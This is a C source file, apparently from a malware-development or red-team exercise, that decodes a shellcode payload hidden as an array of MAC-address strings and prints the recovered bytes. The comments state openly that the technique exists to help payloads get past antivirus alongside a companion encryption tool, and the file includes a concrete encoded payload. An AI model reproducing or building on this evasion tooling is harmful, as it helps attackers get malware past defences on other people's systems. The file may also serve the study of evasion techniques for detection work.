#include <windows.h>
#include <stdio.h>

#include "MACDeSpoofer.h"

// This project is intended to use with "Encrypt Payload"
// as it is difficult to bypass AV with just payload
// encryption or obfuscation.

// -------------------------------- //// -------------------------------- //// -------------------------------- //

// After running your obfuscate payload program,
// (assuming you didnt also obfuscate your AES
// key/iv) you should have a mac array that is
// ready to deobfuscate.

char* mac_array[46] = {
    "49-A4-13-E6-53-B6", "3E-C1-1F-E7-2D-2A", "4A-41-5A-89-26-96", "D6-1F-47-9E-17-78",
    "D0-9D-CF-F3-03-A5", "D2-03-3B-17-9F-63", "DF-AD-CE-60-1E-67", "FE-77-C9-A9-74-EE",
    "A7-7A-26-D7-12-C4", "1B-DF-5B-07-1E-34", "0A-E9-D4-46-A2-BC", "72-61-80-93-C7-F8",
    "5D-11-26-78-2F-5B", "B2-D7-4F-81-FD-05", "C0-37-74-C5-46-69", "CA-0D-48-5F-27-3B",
    "00-14-6C-EB-2E-37", "E2-C3-33-45-33-55", "91-49-23-F4-8D-87", "DC-DB-3F-2A-C0-63",
    "CC-62-F4-3E-56-17", "71-9F-97-4D-64-48", "D5-5D-8A-7B-42-F0", "4B-EB-E3-D9-E9-B9",
    "45-7B-26-02-EF-05", "61-46-8D-62-0A-38", "81-55-35-24-21-6A", "AF-47-55-A5-E9-8C",
    "7B-B1-AF-F6-A8-83", "F9-35-C3-64-46-3C", "78-2A-B7-9D-90-18", "35-D9-5C-00-78-F4",
    "76-17-79-93-CE-D6", "8B-0B-D8-81-4D-9D", "B7-CD-16-BF-83-53", "A8-68-C9-7C-D9-91",
    "D4-33-CB-9E-07-C0", "30-B5-CC-24-D3-BA", "4E-EC-28-2A-11-51", "75-5C-D6-B1-FB-9E",
    "15-8D-1E-DE-2E-64", "87-94-E1-C4-A6-D3", "B2-5E-C8-4A-D3-97", "CF-6B-DA-3E-D3-E0",
    "77-7F-2C-4D-20-BA", "90-60-CC-CC-CC-CC"
};

// -------------------------------- //// -------------------------------- //// -------------------------------- //

// This is simply how we will display the
// shellcode that we have in memory.
// (Not required)

void PrintHexString(IN unsigned char* name, IN const unsigned char* buffer, IN SIZE_T buffer_size)
{
    printf("unsigned char %s[%d] =", name, buffer_size);
    printf("\n{\n    ");

    SIZE_T            buffer_index;

    for (buffer_index = 0; buffer_index < buffer_size - 1; buffer_index++)
    {
        if (buffer_index % 12 == 0)
        {
            if (buffer_index > 0)
            {
                printf("\n    ");
            }
        }
        printf("0x%02X, ", buffer[buffer_index]);
    }

    printf("0x%02X", buffer[buffer_index]);
    printf("\n};\n\n");
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

void main()
{
    // Prepare to move our deobfuscated payloads
    // to these locations.

    PBYTE                   shellcode               = NULL;
    SIZE_T                  shellcode_size          = 0;

    // Deobfuscate and print.

    MacDeobfuscation(mac_array, 46, &shellcode, &shellcode_size);

    PrintHexString("shellcode", shellcode, shellcode_size);
}
